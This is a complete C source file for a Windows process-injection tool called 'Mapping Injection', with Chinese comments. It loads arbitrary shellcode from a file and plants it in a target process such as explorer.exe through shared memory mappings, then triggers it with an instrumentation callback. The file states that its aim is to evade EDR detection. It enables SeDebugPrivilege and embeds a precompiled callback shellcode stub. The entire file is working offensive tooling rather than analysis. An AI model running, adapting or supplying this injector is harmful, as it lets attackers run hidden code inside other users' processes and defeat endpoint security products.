/*
 * Mapping Injection
 *
 * 使用内存映射绕过常见 EDR 检测的进程注入技术
 *
 * 核心原理：
 * - 不使用 VirtualAllocEx/WriteProcessMemory/CreateRemoteThread
 * - 使用 CreateFileMapping + MapViewOfFile3 共享内存
 * - 通过 NtSetInformationProcess(ProcessInstrumentationCallback) 触发执行
 *
 * Syscall 模式：
 * 传统: VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread
 * Mapping: CreateFileMapping -> MapViewOfFile3 (x2) -> NtSetInformationProcess
 *
 * 要求：
 * Windows 10 1703+ (build 10.0.15063+)
 *
 * 作者：基于 @splinter_code 的实现
 */

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// ========================================
// 结构体和类型定义
// ========================================

// Instrumentation Callback 信息
typedef struct _PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION {
    ULONG Version;
    ULONG Reserved;
    PVOID Callback;
} PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION, *PPROCESS_INSTRUMENTATION_CALLBACK_INFORMATION;

// ProcessInformationClass 枚举
typedef enum _PROCESSINFOCLASS {
    ProcessBasicInformation = 0,
    ProcessInstrumentationCallback = 40,  // 我们需要的
    MaxProcessInfoClass = 64
} PROCESSINFOCLASS;

// MapViewOfFile3 参数类型（MinGW 已自动包含）
// MEM_EXTENDED_PARAMETER 在 winnt.h 中定义

// 函数指针类型
typedef NTSTATUS (NTAPI *pNtSetInformationProcess)(
    HANDLE ProcessHandle,
    PROCESS_INFORMATION_CLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength
);

typedef PVOID (NTAPI *pMapViewOfFile3)(
    HANDLE FileMapping,
    HANDLE Process,
    PVOID BaseAddress,
    ULONG64 Offset,
    SIZE_T ViewSize,
    ULONG AllocationType,
    ULONG PageProtection,
    MEM_EXTENDED_PARAMETER *ExtendedParameters,
    ULONG ParameterCount
);

// ========================================
// 回调 Shellcode（预编译的汇编代码）
// ========================================

/*
 * 这是从 callback.asm 编译的机器码（完整版本 - 586 字节）
 *
 * 功能：
 * 1. 检查全局变量（避免重复执行）
 * 2. 保存寄存器
 * 3. 调用真正的 payload
 * 4. 恢复寄存器
 * 5. 通过 syscall 号调用原始函数
 *
 * 注意：偏移 +2 处需要填入全局变量地址（8 字节）
 */
unsigned char callback_shellcode[] = {
    0x48,0xba,0xff,0xff,0xff,0xff,0xff,0x7f,0x00,0x00,0x80,0x3a,0x00,0x74,0x02,0xeb,0x34,0x41,0x52,0x50,0x53,0x55,0x57,0x56,0x54,0x41,0x54,0x41,0x55,0x41,0x56,0x41,0x57,0x48,0x83,0xec,0x20,0x48,0x8d,0x0d,0xa9,0x01,0x00,0x00,0xe8,0x17,0x00,0x00,0x00,0x48,0x83,0xc4,0x20,0x41,0x5f,0x41,0x5e,0x41,0x5d,0x41,0x5c,0x5c,0x5e,0x5f,0x5d,0x5b,0x58,0x41,0x5a,0x41,0xff,0xe2,0x48,0x89,0x54,0x24,0x10,0x48,0x89,0x4c,0x24,0x08,0x57,0x48,0x81,0xec,0xa0,0x00,0x00,0x00,0x48,0xc7,0x44,0x24,0x68,0x00,0x00,0x00,0x00,0xc7,0x44,0x24,0x70,0x30,0x00,0x00,0x00,0x48,0x8d,0x44,0x24,0x78,0x48,0x89,0xc7,0x31,0xc0,0xb9,0x28,0x00,0x00,0x00,0xf3,0xaa,0xb0,0x01,0x48,0x8b,0x8c,0x24,0xb8,0x00,0x00,0x00,0x86,0x01,0x0f,0xbe,0xc0,0x83,0xf8,0x01,0x75,0x02,0xeb,0x71,0x48,0xc7,0x44,0x24,0x50,0x00,0x00,0x00,0x00,0xc7,0x44,0x24,0x48,0x00,0x00,0x00,0x00,0xc7,0x44,0x24,0x40,0x00,0x00,0x00,0x00,0xc7,0x44,0x24,0x38,0x00,0x00,0x00,0x00,0xc7,0x44,0x24,0x30,0x00,0x00,0x00,0x00,0x48,0xc7,0x44,0x24,0x28,0x00,0x00,0x00,0x00,0x48,0x8b,0x84,0x24,0xb0,0x00,0x00,0x00,0x48,0x89,0x44,0x24,0x20,0x49,0xc7,0xc1,0xff,0xff,0xff,0xff,0x4c,0x8d,0x44,0x24,0x70,0xba,0x00,0x00,0x00,0x20,0x48,0x8d,0x4c,0x24,0x68,0xe8,0x20,0x00,0x00,0x00,0x89,0x44,0x24,0x60,0x83,0x7c,0x24,0x60,0x00,0x74,0x0c,0x31,0xc0,0x48,0x8b,0x8c,0x24,0xb8,0x00,0x00,0x00,0x86,0x01,0x48,0x81,0xc4,0xa0,0x00,0x00,0x00,0x5f,0xc3,0x65,0x67,0x48,0xa1,0x60,0x00,0x00,0x00,0x81,0xb8,0x20,0x01,0x00,0x00,0x00,0x28,0x00,0x00,0x74,0x64,0x81,0xb8,0x20,0x01,0x00,0x00,0x5a,0x29,0x00,0x00,0x74,0x5f,0x81,0xb8,0x20,0x01,0x00,0x00,0x39,0x38,0x00,0x00,0x74,0x5a,0x81,0xb8,0x20,0x01,0x00,0x00,0xd7,0x3a,0x00,0x00,0x74,0x55,0x81,0xb8,0x20,0x01,0x00,0x00,0xab,0x3f,0x00,0x00,0x74,0x50,0x81,0xb8,0x20,0x01,0x00,0x00,0xee,0x42,0x00,0x00,0x74,0x4b,0x81,0xb8,0x20,0x01,0x00,0x00,0x63,0x45,0x00,0x00,0x74,0x46,0x81,0xb8,0x20,0x01,0x00,0x00,0xba,0x47,0x00,0x00,0x74,0x41,0x81,0xb8,0x20,0x01,0x00,0x00,0xbb,0x47,0x00,0x00,0x74,0x3c,0x7f,0x41,0xeb,0x46,0xb8,0xb3,0x00,0x00,0x00,0xeb,0x44,0xb8,0xb4,0x00,0x00,0x00,0xeb,0x3d,0xb8,0xb6,0x00,0x00,0x00,0xeb,0x36,0xb8,0xb9,0x00,0x00,0x00,0xeb,0x2f,0xb8,0xba,0x00,0x00,0x00,0xeb,0x28,0xb8,0xbb,0x00,0x00,0x00,0xeb,0x21,0xb8,0xbc,0x00,0x00,0x00,0xeb,0x1a,0xb8,0xbd,0x00,0x00,0x00,0xeb,0x13,0xb8,0xbd,0x00,0x00,0x00,0xeb,0x0c,0xb8,0xc1,0x00,0x00,0x00,0xeb,0x05,0xb8,0xff,0xff,0xff,0xff,0x49,0x89,0xca,0x0f,0x05,0xc3,0x90
};

// 全局变量初始值（用于标记是否已执行）
unsigned char init_global_vars = '\x00';

// ========================================
// 函数声明
// ========================================

BOOL SetPrivilege(HANDLE hToken, const wchar_t *lpszPrivilege, BOOL bEnablePrivilege);
void EnableDebugPrivilege();
DWORD GetProcessIdByName(const wchar_t *processName);
LPVOID MappingInjectionAlloc(HANDLE hProc, unsigned char *buffer, SIZE_T bufferSize, DWORD protectionType);

// ========================================
// 主函数
// ========================================

int main(int argc, char *argv[])
{
    printf("========================================\n");
    printf("  Mapping Injection\n");
    printf("  基于内存映射的进程注入\n");
    printf("========================================\n\n");

    if (argc != 3) {
        printf("用法: %s <目标进程名或PID> <shellcode文件>\n", argv[0]);
        printf("示例: %s explorer.exe payload.bin\n", argv[0]);
        printf("      %s 1234 payload.bin\n", argv[0]);
        return 1;
    }

    // 解析参数
    const char *target = argv[1];
    const char *shellcode_path = argv[2];

    // 读取 shellcode
    FILE *fp = fopen(shellcode_path, "rb");
    if (!fp) {
        printf("[!] 无法打开 shellcode 文件: %s\n", shellcode_path);
        return 1;
    }

    fseek(fp, 0, SEEK_END);
    size_t shellcode_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    unsigned char *shellcode = (unsigned char *)malloc(shellcode_size);
    if (!shellcode) {
        printf("[!] 内存分配失败\n");
        fclose(fp);
        return 1;
    }

    fread(shellcode, 1, shellcode_size, fp);
    fclose(fp);

    printf("[+] 已读取 shellcode: %lu 字节\n", (unsigned long)shellcode_size);

    // 获取 NtSetInformationProcess 和 MapViewOfFile3
    pNtSetInformationProcess NtSetInformationProcess =
        (pNtSetInformationProcess)GetProcAddress(GetModuleHandleW(L"ntdll"), "NtSetInformationProcess");

    if (!NtSetInformationProcess) {
        printf("[!] 无法获取 NtSetInformationProcess\n");
        free(shellcode);
        return 1;
    }

    // 提升权限
    EnableDebugPrivilege();

    // 获取目标进程 PID
    DWORD targetPid = 0;
    if (isdigit(target[0])) {
        targetPid = atoi(target);
    } else {
        wchar_t wTarget[256];
        mbstowcs(wTarget, target, 256);
        targetPid = GetProcessIdByName(wTarget);
        if (targetPid == 0) {
            printf("[!] 未找到进程: %s\n", target);
            free(shellcode);
            return 1;
        }
    }

    printf("[*] 目标进程 PID: %lu\n", targetPid);

    // 打开目标进程
    HANDLE hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_SET_INFORMATION, FALSE, targetPid);
    if (!hProc) {
        printf("[!] 无法打开目标进程: %lu (错误: %lu)\n", targetPid, GetLastError());
        free(shellcode);
        return 1;
    }

    printf("[+] 已打开目标进程\n");

    // 1. 分配全局变量（用于标记执行状态）
    printf("\n[*] 步骤 1: 分配全局变量...\n");
    LPVOID globalVarAddr = MappingInjectionAlloc(hProc, &init_global_vars,
                                                 sizeof(init_global_vars),
                                                 PAGE_READWRITE);

    // 2. 构建最终 callback（callback + shellcode）
    printf("[*] 步骤 2: 构建 callback...\n");
    size_t callback_size = sizeof(callback_shellcode);
    size_t final_size = callback_size + shellcode_size;
    unsigned char *final_callback = (unsigned char *)malloc(final_size);

    if (!final_callback) {
        printf("[!] 内存分配失败\n");
        free(shellcode);
        CloseHandle(hProc);
        return 1;
    }

    // 复制 callback 并填入全局变量地址（偏移 +2）
    memcpy(final_callback, callback_shellcode, callback_size);
    memcpy(&final_callback[2], &globalVarAddr, 8);

    // 追加 shellcode
    memcpy(final_callback + callback_size, shellcode, shellcode_size);

    printf("[+] 最终 callback 大小: %lu 字节 (callback: %lu + shellcode: %lu)\n",
           (unsigned long)final_size, (unsigned long)callback_size, (unsigned long)shellcode_size);

    // 3. 分配 callback + shellcode
    printf("[*] 步骤 3: 映射 callback 到目标进程...\n");
    LPVOID callbackAddr = MappingInjectionAlloc(hProc, final_callback,
                                                final_size,
                                                PAGE_EXECUTE_READ);

    printf("[+] Callback 地址: 0x%p\n", callbackAddr);

    // 4. 设置 Instrumentation Callback
    printf("[*] 步骤 4: 设置 instrumentation callback...\n");
    PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION nirvana;
    nirvana.Callback = (PVOID)(ULONG_PTR)callbackAddr;
    nirvana.Reserved = 0;  // 始终为 0
    nirvana.Version = 0;   // x64 为 0，x86 为 1

    NTSTATUS status = NtSetInformationProcess(
        hProc,
        (PROCESS_INFORMATION_CLASS)ProcessInstrumentationCallback,
        &nirvana,
        sizeof(nirvana)
    );

    if (status != 0) {
        printf("[!] NtSetInformationProcess 失败: 0x%lX\n", status);
        printf("[!] 你是否拥有 SeDebugPrivilege？\n");
    } else {
        printf("[+] Instrumentation callback 设置成功！\n");
        printf("[+] 当目标进程调用 syscall 时，代码将被执行\n");
    }

    // 清理
    free(shellcode);
    free(final_callback);
    CloseHandle(hProc);

    return 0;
}

// ========================================
// 辅助函数实现
// ========================================

// 设置权限
BOOL SetPrivilege(HANDLE hToken, const wchar_t *lpszPrivilege, BOOL bEnablePrivilege)
{
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValueW(NULL, lpszPrivilege, &luid)) {
        printf("[!] LookupPrivilegeValueW 失败: %lu\n", GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = bEnablePrivilege ? SE_PRIVILEGE_ENABLED : 0;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        printf("[!] AdjustTokenPrivileges 失败: %lu\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

// 启用调试权限
void EnableDebugPrivilege()
{
    HANDLE hToken = NULL;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
    SetPrivilege(hToken, L"SeDebugPrivilege", TRUE);
    CloseHandle(hToken);
}

// 根据进程名获取 PID
DWORD GetProcessIdByName(const wchar_t *processName)
{
    PROCESSENTRY32W entry = {0};
    entry.dwSize = sizeof(PROCESSENTRY32W);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE)
        return 0;

    DWORD pidFound = 0;
    if (Process32FirstW(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, processName) == 0) {
                pidFound = entry.th32ProcessID;
                break;
            }
        } while (Process32NextW(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return pidFound;
}

// 映射注入分配函数
LPVOID MappingInjectionAlloc(HANDLE hProc, unsigned char *buffer, SIZE_T bufferSize, DWORD protectionType)
{
    // 获取 MapViewOfFile3 函数指针
    pMapViewOfFile3 MapViewOfFile3 =
        (pMapViewOfFile3)GetProcAddress(GetModuleHandleW(L"kernelbase.dll"), "MapViewOfFile3");

    if (!MapViewOfFile3) {
        printf("[!] MapViewOfFile3 不可用 (需要 Windows 10 1703+)\n");
        exit(1);
    }

    // 1. 创建文件映射对象（匿名，不关联文件）
    HANDLE hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE, NULL,
                                       PAGE_EXECUTE_READWRITE, 0,
                                       (DWORD)bufferSize, NULL);
    if (!hFileMap) {
        printf("[!] CreateFileMapping 失败: %lu\n", GetLastError());
        exit(1);
    }

    printf("  [+] 已创建文件映射对象\n");

    // 2. 映射到本地进程（用于写入数据）
    LPVOID lpMapAddress = MapViewOfFile3(hFileMap, GetCurrentProcess(), NULL,
                                         0, 0, 0, PAGE_READWRITE, NULL, 0);
    if (!lpMapAddress) {
        printf("[!] MapViewOfFile3 (本地) 失败: %lu\n", GetLastError());
        CloseHandle(hFileMap);
        exit(1);
    }

    // 3. 写入数据
    memcpy(lpMapAddress, buffer, bufferSize);
    printf("  [+] 已写入 %lu 字节到映射对象\n", (unsigned long)bufferSize);

    // 4. 映射到目标进程（共享内存）
    LPVOID lpMapAddressRemote = MapViewOfFile3(hFileMap, hProc, NULL,
                                               0, 0, 0, protectionType, NULL, 0);
    if (!lpMapAddressRemote) {
        printf("[!] MapViewOfFile3 (远程) 失败: %lu\n", GetLastError());
        UnmapViewOfFile(lpMapAddress);
        CloseHandle(hFileMap);
        exit(1);
    }

    printf("  [+] 已映射到远程进程: 0x%p (保护: 0x%lX)\n", lpMapAddressRemote, protectionType);

    // 5. 清理本地映射
    UnmapViewOfFile(lpMapAddress);
    CloseHandle(hFileMap);

    return lpMapAddressRemote;
}
